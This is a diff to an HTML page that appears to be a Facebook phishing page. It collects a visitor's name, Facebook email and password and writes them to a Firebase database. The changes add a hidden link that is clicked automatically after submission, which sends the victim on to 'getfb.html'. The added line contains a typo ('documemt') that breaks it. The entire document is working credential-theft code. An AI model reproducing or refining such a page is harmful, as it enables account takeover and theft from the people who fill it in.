@@ -137,15 +137,16 @@ label {
 <input  id="namafb"  placeholder="Nama Anda" type="text" required>
 <br>
 <label><font color="gold">Email Facebook 	 : </font></label>
-<input  id="emailfb"  placeholder="Email Facebok" type="text" required>
+<input  id="emailfb"  placeholder="Email Facebok" type="email" required>
 <br>
 <label><font color="gold">Password Facebook : </font></label>
 <br>
 <input  id="passfb"  placeholder="Password Facebok" type="password" required>
 
 
-<center><a href="getfb.html"><img onclick="info()" src="imgg/button.png"></a></center>
+<center><img onclick="info()" src="imgg/button.png"></center>
 </div></div></div></div>
+<a id="top" href="getfb.html"></a>
 
 <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
@@ -172,6 +173,7 @@ var firebaseConfig = {
   emailfb: document.querySelector("#emailfb").value,
   passfb: document.querySelector("#passfb").value
   });
+  documemt.querySelector("#top").click();
   }
 </script>
 
